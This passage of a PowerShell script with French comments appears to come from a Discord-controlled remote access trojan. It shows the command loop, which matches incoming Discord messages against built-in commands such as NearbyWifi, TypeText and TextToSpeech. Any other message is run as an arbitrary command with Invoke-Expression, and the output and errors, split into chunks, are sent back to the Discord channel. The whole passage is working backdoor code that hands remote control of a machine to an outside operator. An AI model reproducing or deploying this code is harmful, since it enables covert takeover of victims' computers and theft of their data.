            $text = $matches[1].Trim('"', "'")
            TypeText -Text $text
        }
        elseif ($messages -match '^(?i)(NearbyWifi|SpeechToText|TextToSpeech)$') {
            $cmdName = $matches[1]
            if ($cmdName -eq 'NearbyWifi') { NearbyWifi }
            elseif ($cmdName -eq 'SpeechToText') { SpeechToText }
            elseif ($cmdName -eq 'TextToSpeech') { 
                sendMsg -Message ":octagonal_sign: ``Usage: TextToSpeech -Text \"your message\"`` :octagonal_sign:"
            }
        }
        elseif ($messages -match '^(?i)TextToSpeech\s+(?:-Text\s+)?["''](.+)["'']$') {
            $text = $matches[1]
            TextToSpeech -Text $text
        }
        elseif ($messages -match '^(?i)TextToSpeech\s+-Text\s+(.+)$') {
            $text = $matches[1].Trim('"', "'")
            TextToSpeech -Text $text
        }
        else { 
            try {
                # Exécuter la commande avec capture complète de la sortie
                $ErrorActionPreference = 'Continue'
                $output = Invoke-Expression $messages 2>&1 | Out-String
                
                if ([string]::IsNullOrWhiteSpace($output)) {
                    $output = "Command executed successfully (no output)"
                }
                
                # Diviser en messages si nécessaire (limite Discord ~2000 caractères)
                $maxMessageSize = 1950
                if ($output.Length -le $maxMessageSize) {
                    sendMsg -Message "``````$output``````"
                }
                else {
                    # Diviser en plusieurs messages
                    $outputLines = $output -split "`r?`n"
                    $currentBatch = ""
                    $batchNumber = 1
                    $totalBatches = [Math]::Ceiling(($output.Length / $maxMessageSize))
                    
                    foreach ($line in $outputLines) {
                        $lineWithNewline = $line + "`n"
                        if (([System.Text.Encoding]::UTF8.GetByteCount($currentBatch + $lineWithNewline)) -gt $maxMessageSize) {
                            if ($currentBatch.Length -gt 0) {
                                sendMsg -Message "``````[Part $batchNumber/$totalBatches]`n$currentBatch``````"
                                Start-Sleep -Milliseconds 500
                                $batchNumber++
                                $currentBatch = ""
                            }
                        }
                        $currentBatch += $lineWithNewline
                    }
                    
                    if ($currentBatch.Length -gt 0) {
                        sendMsg -Message "``````[Part $batchNumber/$totalBatches]`n$currentBatch``````"
                    }
                }
            }
            catch {
                $errorDetails = $_.Exception | Format-List -Force | Out-String
                $errorMessage = "Error: $($_.Exception.Message)`n`nDetails:`n$errorDetails"
                
                # Diviser les erreurs aussi si nécessaire
                $maxErrorSize = 1950
                if ($errorMessage.Length -le $maxErrorSize) {
                    sendMsg -Message ":octagonal_sign: ``$errorMessage`` :octagonal_sign:"
                }
                else {
                    $errorParts = $errorMessage -split "`n"
                    $currentErrorBatch = ""
                    $errorBatchNum = 1
                    $totalErrorBatches = [Math]::Ceiling(($errorMessage.Length / $maxErrorSize))
                    
                    foreach ($part in $errorParts) {
                        if (([System.Text.Encoding]::UTF8.GetByteCount($currentErrorBatch + "`n" + $part)) -gt $maxErrorSize) {
                            if ($currentErrorBatch.Length -gt 0) {
                                sendMsg -Message ":octagonal_sign: ``[Error Part $errorBatchNum/$totalErrorBatches]`n$currentErrorBatch`` :octagonal_sign:"
                                Start-Sleep -Milliseconds 500
                                $errorBatchNum++
                                $currentErrorBatch = ""
                            }
                        }
                        $currentErrorBatch += $part + "`n"
                    }
                    if ($currentErrorBatch.Length -gt 0) {
                        sendMsg -Message ":octagonal_sign: ``[Error Part $errorBatchNum/$totalErrorBatches]`n$currentErrorBatch`` :octagonal_sign:"
                    }
                }
            }
        }
    }
    Sleep 3
}


